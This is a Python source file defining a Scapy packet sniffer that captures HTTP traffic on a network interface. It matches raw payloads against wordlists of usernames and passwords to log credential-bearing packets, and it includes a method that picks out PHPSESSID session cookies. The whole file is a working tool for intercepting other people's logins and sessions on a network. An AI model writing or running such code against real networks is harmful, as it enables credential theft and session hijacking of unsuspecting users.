from scapy.all import *
from scapy_http import http
import general


class PacketSniffer:

    def __init__(self, interface):
        self.interface = interface
        self.cek = False
        self.log = list()
        self.db_username = general.file_to_list('db/db_username.txt')
        self.db_pass = general.file_to_list('db/db_password.txt')
        self.s = sniff(iface=self.interface, store=0, prn=self.process_sniffer)
        #self.boot(interface)

    def boot(self):
        pass
        #socket = conf.L2listen(type=ETH_P_ALL, iface=interface)
        #self.test = sniff(opened_socket=socket, store=0, prn=self.process_sniffer, stop_filter=self.stop_sniffer)


    def process_sniffer(self, packet):
        #print("process_sniffer")
        self.cek = True
        if packet.haslayer(http.HTTPRequest):
            data = packet.show(dump=True)
            data_http = packet[http.HTTPRequest].show(dump=True)
            print(data_http)
            # if str(data).__contains__('POST') and str(data).__contains__('wordpress'):
             #    print(data)
            self.get_credential(packet)

    def get_credential(self, packet):
        if packet.haslayer(Raw):
            load = packet[Raw].load
            for username in self.db_username:
                if username in str(load):
                    self.log.append(load)
                    break
            for password in self.db_pass:
                if password in str(load):
                    self.log.append(load)
                    break

    def get_session(self, packet):
        if packet.haslayer(Raw):
            data = packet[Raw].load
            print("scapy raw : " + str(data))
            keywords = ["PHPSESSID"]
            for keyword in keywords:
                if keyword in str(data):
                    return data

    def stop_sniffer(self):
        self.s.socket.close()

# PacketSniffer("enp0s8")
# sniff(iface='enp0s3', prn=http_header, count=3)
